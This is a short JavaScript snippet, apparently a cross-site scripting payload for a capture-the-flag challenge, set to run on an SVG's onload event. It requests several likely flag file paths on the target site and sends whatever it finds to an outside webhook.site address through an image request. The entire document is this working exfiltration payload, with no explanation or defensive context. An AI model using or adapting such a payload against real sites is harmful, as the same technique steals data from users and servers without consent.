svg.onload:
const paths = ['/flag', '/flag.txt', '/static/flag', '/home/ctf/flag'];
paths.forEach(p => {
  fetch(p)
    .then(r => r.text())
    .then(t => {
      if (!t.includes('Not Found')) {
        new Image().src =
          'https://webhook.site/e384bc4d-14d1-4f4d-a359-a99b9431d317?flag=' +
          encodeURIComponent(p + ': ' + t);
      }
    });
});
